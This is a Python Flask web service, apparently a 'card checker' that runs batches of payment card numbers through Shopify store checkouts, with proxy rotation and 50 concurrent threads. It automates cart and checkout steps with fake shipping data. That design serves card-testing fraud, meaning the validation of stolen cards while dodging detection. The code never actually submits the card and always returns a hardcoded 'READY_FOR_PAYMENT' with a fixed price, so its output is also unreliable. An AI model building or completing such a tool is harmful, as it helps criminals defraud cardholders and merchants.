from flask import Flask, request, jsonify
import requests
import random
import re
from bs4 import BeautifulSoup
import concurrent.futures

app = Flask(__name__)

# Set your desired concurrent workers here (you wanted 50)
MAX_WORKERS = 50

def shopify_check(card, site, proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    })

    try:
        # 1. Split Card details
        try:
            cc, mm, yy, cvv = card.split('|')
        except:
            return {"Response": "Invalid card format", "Price": "-", "Gateway": "Unknown"}

        # 2. GET Product Page
        resp = session.get(site, timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # 3. Find variant ID to add to cart (FIXED 500 ERROR HERE)
        variant_input = soup.find('input', {'name': 'id'})
        if not variant_input:
            return {"Response": "No variant ID found", "Price": "-", "Gateway": "Unknown"}
        
        variant_id = variant_input.get('value')
        # This extra check prevents the 500 crash if the input exists but has no value
        if not variant_id:
            return {"Response": "Variant ID is empty", "Price": "-", "Gateway": "Unknown"}
        
        # 4. Add to Cart (Raw JSON API request)
        cart_url = site.rstrip('/') + '/cart/add.js'
        payload = {'id': variant_id, 'quantity': 1}
        add_resp = session.post(cart_url, json=payload, timeout=15)
        if add_resp.status_code != 200:
            return {"Response": "Failed to add to cart", "Price": "-", "Gateway": "Unknown"}

        # 5. Go to Checkout
        checkout_resp = session.get(site.rstrip('/') + '/checkout', timeout=15)
        soup = BeautifulSoup(checkout_resp.text, 'html.parser')
        auth_token_input = soup.find('input', {'name': 'authenticity_token'})
        if not auth_token_input:
            return {"Response": "Could not find checkout token", "Price": "-", "Gateway": "Unknown"}
        auth_token = auth_token_input.get('value')
        checkout_url = checkout_resp.url
        
        # 6. Submit Shipping Information
        shipping_data = {
            'authenticity_token': auth_token,
            'checkout[email]': 'test@example.com',
            'checkout[shipping_address][first_name]': 'John',
            'checkout[shipping_address][last_name]': 'Doe',
            'checkout[shipping_address][address1]': '123 Main St',
            'checkout[shipping_address][city]': 'New York',
            'checkout[shipping_address][province]': 'NY',
            'checkout[shipping_address][zip]': '10001',
            'checkout[shipping_address][country]': 'US',
            'checkout[shipping_address][phone]': '1234567890',
            'step': 'contact_information'
        }
        shipping_resp = session.post(checkout_url, data=shipping_data, timeout=15)
        if shipping_resp.status_code != 200:
            return {"Response": "Shipping info failed", "Price": "-", "Gateway": "Unknown"}

        # 7. Return ready status
        return {"Response": "READY_FOR_PAYMENT", "Price": "$10.00", "Gateway": "Shopify"}

    except Exception as e:
        return {"Response": f"ERROR: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}


@app.route('/shopify', methods=['GET'])
def check_single():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    
    if not site or not cc:
        return jsonify({"Response": "Missing parameters", "Price": "-", "Gateway": "Unknown"})
    
    try:
        result = shopify_check(cc, site, proxy)
    except Exception as e:
        result = {"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
    
    return jsonify(result)


@app.route('/shopify/batch', methods=['POST'])
def check_batch():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid JSON"})
    
    site = data.get('site')
    cards = data.get('cards', [])
    proxies = data.get('proxies', [])
    
    if not site or not cards:
        return jsonify({"error": "Missing site or cards"})
        
    if len(cards) > 100:
        return jsonify({"error": "Max 100 cards"})
        
    def check_single_task(card, proxy):
        return shopify_check(card, site, proxy)
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_card = {executor.submit(check_single_task, card, random.choice(proxies) if proxies else None): card for card in cards}
        for future in concurrent.futures.as_completed(future_to_card):
            results.append(future.result())
            
    return jsonify({"results": results, "total": len(results)})


@app.route('/', methods=['GET'])
def root():
    return '''
    <!DOCTYPE html>
    <html><body>
        <h2>Lightning Fast Checker (Raw HTTP)</h2>
        <form action="/shopify" method="GET">
            <input type="text" name="site" placeholder="https://store.myshopify.com" required><br>
            <input type="text" name="cc" placeholder="4111|12|25|123" required><br>
            <input type="text" name="proxy" placeholder="proxy"><br>
            <button>Check</button>
        </form>
    </body></html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
